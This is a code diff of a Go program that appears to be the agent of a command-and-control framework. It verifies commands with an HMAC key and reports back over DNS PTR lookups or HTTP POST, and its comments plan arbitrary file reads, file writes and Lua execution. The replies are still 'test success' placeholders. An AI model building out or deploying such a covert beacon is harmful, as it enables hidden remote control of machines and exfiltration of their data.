@@ -32,6 +32,8 @@ var PostURI string
 var GetURI string
 
 func main() {
+	num, _ := strconv.Atoi(CompUUID)
+	var hexId uint16 = uint16(num)
 	// Load configuration from embedded data
 	conf, err := shared.LoadConfig()
 	if err != nil {
@@ -121,7 +123,7 @@ func main() {
 				// Returns the result of execution (stdout or bool) or returns an error
 				if dnsConf == true {
 					encRes := shared.StringToIPv6List("test success")
-					err := shared.SendPTRRequest(CompUUID, encRes)
+					err := shared.SendPTRRequest(hexId, encRes)
 					if err != true {
 						return
 					}
@@ -196,21 +198,23 @@ func main() {
 			//fmt.Println("Decoded string:", decoded)
 
 			// Verify the message with the received HMAC
-			if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+			switch shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+			case true:
 				fmt.Println("HMAC is valid!")
 				// Here is where command processing should occur
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				if dnsConf == true {
+				switch dnsConf {
+				case true:
 					encRes := []string{shared.Ipv6ToPTR("test success")}
-					err := shared.SendPTRRequest(CompUUID, encRes)
+					err := shared.SendPTRRequest(hexId, encRes)
 					if err != true {
 						return
 					}
 					fmt.Println("Success")
 					break
-				} else {
+				case false:
 					request, err := shared.SendDataRequest(postUrl, "test success")
 					if err != nil {
 						return
@@ -218,7 +222,7 @@ func main() {
 					fmt.Println(request)
 					break
 				}
-			} else {
+			case false:
 				fmt.Println("HMAC is invalid or message was tampered with.")
 				break
 			}
